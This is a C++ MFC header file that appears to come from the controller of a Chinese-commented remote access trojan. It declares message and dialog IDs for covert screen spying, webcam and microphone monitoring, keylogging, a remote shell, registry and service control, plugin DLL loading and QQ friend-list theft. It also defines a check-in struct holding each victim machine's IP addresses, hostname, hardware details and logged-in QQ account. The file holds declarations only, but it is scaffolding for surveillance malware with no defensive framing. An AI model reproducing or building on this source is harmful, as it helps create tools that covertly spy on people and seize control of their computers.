// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently, but
// are changed infrequently
//

#if !defined(AFX_STDAFX_H__4B858A7B_A54D_460A_A51B_CD810BB0B803__INCLUDED_)
#define AFX_STDAFX_H__4B858A7B_A54D_460A_A51B_CD810BB0B803__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define VC_EXTRALEAN		// Exclude rarely-used stuff from Windows headers

#include <afxwin.h>         // MFC core and standard components
#include <afxext.h>         // MFC extensions
#include <afxcview.h>
#include <afxdisp.h>        // MFC Automation classes
#include <afxdtctl.h>		// MFC support for Internet Explorer 4 Common Controls
#ifndef _AFX_NO_AFXCMN_SUPPORT
#include <afxcmn.h>			// MFC support for Windows Common Controls
#endif // _AFX_NO_AFXCMN_SUPPORT

#include "sal.h"
#include <afxtempl.h>
#include <winsock2.h>
#include <winioctl.h>

#define _XTP_STATICLINK
#include "XTToolkitPro.h"
#include "SkinH.h"
#pragma comment ( lib, "SkinH.lib" )

#include "cJSON.h"
#include "include\IOCPServer.h"
#include "macros.h"
#include "vfw.h" // DrawDibOpen
#pragma comment(lib, "vfw32.lib")

enum 
{
	WM_CLIENT_CONNECT = WM_APP + 0x1001,
	WM_CLIENT_CLOSE,
	WM_CLIENT_NOTIFY,
	WM_DATA_IN_MSG,
	WM_DATA_OUT_MSG,

	WM_ADDTOLIST = WM_USER + 102,	// 添加到列表视图中
	WM_ADDFINDGROUP,				// 上线时查找分组
	WM_REMOVEFROMLIST,				// 从列表视图中删除
	WM_OPENMANAGERDIALOG,			// 打开一个文件管理窗口
	WM_OPENSCREENSPYDIALOG,			// 打开一个屏幕监视窗口
	WM_OPENWEBCAMDIALOG,			// 打开摄像头监视窗口
	WM_OPENAUDIODIALOG,				// 打开一个语音监听窗口
	WM_OPENKEYBOARDDIALOG,			// 打开键盘记录窗口
	WM_OPENSYSTEMDIALOG,			// 打开进程管理窗口
	WM_OPENSHELLDIALOG,				// 打开shell窗口
	WM_RESETPORT,					// 改变端口
	WM_OPENSYSINFODIALOG,			// 打开服务器信息窗口
	WM_OPENREGEDITDIALOG,           // 打开注册表管理窗口
	WM_OPENDLLDLG,                  // 打开功能控件加载窗口
	WM_OPENCHATDIALOG,		    	// 打开交谈窗口
	WM_OPENQQINFODIALOG,			// 打开QQ好友信息窗口
	WM_OPENPSERLISTDIALOG,			// 打开服务管理窗口
	WM_MODIFYLIST,					// 筛选
	WM_NOMODIFYLIST,				// 筛选
	WM_OPENPROXYMAPDIALOG,
//////////////////////////////////////////////////////////////////////////
	FILEMANAGER_DLG = 1,
	SCREENSPY_DLG,
	WEBCAM_DLG,
	AUDIO_DLG,
	KEYBOARD_DLG,
	SYSTEM_DLG,
	CHAT_DLG,
	SHELL_DLG,
	SYSINFO_DLG,
	REGEDIT_DLG,
	SERMANAGER_DLG,
	QQINFO_DLG,
	DLL_DLG,
	PROXYMAP_DLG
};

typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	DWORD			dwCPUClockMhz;	// CPU频率
	int				nCPUNumber;		// CPU核数
	IN_ADDR			WanIPAddress;	// 存储32位的IPv4的地址数据结构(外网)
	IN_ADDR			LanIPAddress;	// 存储32位的IPv4的地址数据结构(内网)
	char			HostName[256];	// 主机名
	bool			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
	DWORD			Speed;		    // 网卡
	DWORD			MemSize;		// 内存大小
	DWORD			DriverSize;		// 硬盘容量
	char			UpGroup[50];	// 上线分组
	char			RunTime[32];	// 运行时间
	char			szVersion[32];	// 上线版本
	char            Virus[50];
	BOOL            bIs64;          // 32位or 64位 1为64 0为32     
	char			MarkTime[50];   // 服务端安装时间
	CHAR szQQNum[256];     //当前运行的QQ号码
	BOOL  bIsActive;	   //用户状态
	TCHAR sznet[20];       //net type
	IN_ADDR	    	IPAddress;	// 存储32位的IPv4的地址数据结构
}LOGININFO;

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;



#define WM_SYSTRAY						WM_USER+100
#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__4B858A7B_A54D_460A_A51B_CD810BB0B803__INCLUDED_)
